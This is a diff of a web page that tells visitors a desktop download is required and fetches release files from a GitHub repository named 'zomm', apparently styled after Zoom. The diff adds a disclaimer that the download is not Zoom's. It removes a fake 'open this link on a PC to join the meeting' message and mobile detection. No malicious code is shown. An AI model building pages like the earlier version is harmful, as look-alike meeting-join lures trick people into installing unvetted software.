@@ -41,12 +41,11 @@
   <main class="panel" style="display: none;">
     <div class="notice">
       <strong></strong>
-      .
+      This download is provided by an independent publisher. It is not
+      developed, operated, sponsored, or endorsed by Zoom Video Communications,
+      Inc. It is not a Zoom application or meeting component, and downloading
+      it will not join a meeting.
     </div>
-<div id="msg">
-    <h2>Unable to join on mobile</h2>
-    <p>Please open this link on a PC to join the meeting.</p>
-  </div>
 
     <section id="message" aria-live="polite">
       <h1>Desktop download required</h1>
@@ -67,18 +66,6 @@
   <script>
     "use strict";
 
-
-    function isMobileDevice() {
-      // Check user agent
-      const ua = navigator.userAgent || navigator.vendor || window.opera;
-      const uaCheck = /android|iphone|ipad|ipod|windows phone/i.test(ua);
-
-      // Check touch + small screen as backup (catches edge cases)
-      const touchCheck = ('ontouchstart' in window || navigator.maxTouchPoints > 0) 
-                          && window.innerWidth <= 900;
-
-      return uaCheck || touchCheck;
-    }
     // These asset names must match the files attached to your GitHub release.
     const RELEASE_BASE =
       "https://github.com/Trades25/zomm/releases/latest/download/";
